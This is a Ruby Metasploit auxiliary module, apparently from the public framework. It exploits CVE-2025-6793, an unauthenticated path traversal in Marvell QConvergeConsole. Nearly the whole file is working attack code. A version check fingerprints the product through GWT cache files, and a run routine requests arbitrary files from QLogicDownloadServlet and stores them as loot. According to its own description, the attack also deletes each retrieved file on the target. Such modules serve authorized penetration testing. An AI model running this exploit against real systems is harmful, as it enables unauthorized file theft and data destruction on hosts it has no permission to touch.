##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Marvell QConvergeConsole Path Traversal (CVE-2025-6793)',
        'Description' => %q{
          This module exploits a path traversal vulnerability (CVE-2025-6793) in Marvell QConvergeConsole <= v5.5.0.85 to retrieve arbitrary files from the system. No authentication is required to exploit this issue.
          Note that whatever file will be retrieved, will also be deleted from the remote server.
        },
        'Author' => [
          'Michael Heinzl', # MSF Module
          'rgod' # Discovery
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-6793'],
          ['URL', 'https://www.zerodayinitiative.com/advisories/ZDI-25-450/']
        ],
        'DisclosureDate' => '2025-06-27',
        'DefaultOptions' => {
          'RPORT' => 8443,
          'SSL' => true
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for QConvergeConsole', 'QConvergeConsole']),
        OptString.new('TARGET_FILE', [false, 'The file path to read from the target system.', 'win.ini']),
        OptString.new('TARGET_DIR', [true, 'The folder where the file is located.', 'C:\Windows'])
      ]
    )
  end

  def check
    # code is obfuscated, retrieve file reference through gwt.Main.nocache.js
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(
        target_uri.path, 'com.qlogic.qms.hba.gwt.Main', 'com.qlogic.qms.hba.gwt.Main.nocache.js'
      )
    })

    return Exploit::CheckCode::Unknown('No response from server') unless res&.code == 200

    # e.g., BB025677C3CC9C8B12F0CB2553088424
    strong_name = res.body.match(/Sb='([A-Fa-f0-9]{32})'/)&.captures&.first
    strong_name ||= res.body.match(/([A-Fa-f0-9]{32})\.cache\.html/)&.captures&.first

    return Exploit::CheckCode::Detected('Could not determine GWT strong name') unless strong_name

    vprint_status("GWT strong name: #{strong_name}")

    res2 = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(
        target_uri.path, 'com.qlogic.qms.hba.gwt.Main', "#{strong_name}.cache.html"
      )
    })

    return Exploit::CheckCode::Unknown('Could not retrieve cache file') unless res2&.code == 200

    data = res2.body

    # Grab the first occurrence of a v5.0.x version; obfuscated response contains other version identifiers too for other components
    match = data.match(/'v(5\.0\.\d+)'/i) || data.match(/v(5\.0\.\d+)/i)

    return Exploit::CheckCode::Unknown('No version string found') unless match

    version = Rex::Version.new(match[1])

    vprint_status("Detected version: #{version}")

    if version <= Rex::Version.new('5.0.85')
      return Exploit::CheckCode::Appears("Vulnerable version detected: #{version}")
    end

    Exploit::CheckCode::Detected("QConvergeConsole detected (version #{version})")
  end

  def run
    folder = URI.encode_www_form_component(datastore['TARGET_DIR'])
    file = URI.encode_www_form_component(datastore['TARGET_FILE'])

    uri = normalize_uri(
      target_uri.path,
      'com.qlogic.qms.hba.gwt.Main',
      'QLogicDownloadServlet'
    )

    uri = "#{uri}?folder=#{folder}&file=#{file}"
    vprint_status("Request: #{uri}")
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => uri
    })

    fail_with(Failure::UnexpectedReply, 'No response from server') unless res
    fail_with(Failure::UnexpectedReply, "HTTP #{res.code}") unless res.code == 200
    fail_with(Failure::UnexpectedReply, 'Invalid path or file does not exist (empty body)') if res.body.nil? || res.body.empty?

    print_good("File retrieved: #{File.join(datastore['TARGET_DIR'], datastore['TARGET_FILE'])}")

    path = store_loot('qconvergeconsole.file', 'application/octet-stream', datastore['RHOSTS'], res.body, datastore['TARGET_FILE'], 'File retrieved through QConvergeConsole path traversal (CVE-2025-6793).')
    print_status("File saved as loot: #{path}")

    report_service(
      host: rhost,
      port: rport,
      proto: 'tcp',
      name: 'https',
      info: 'Marvell QConvergeConsole'
    )
  end
end
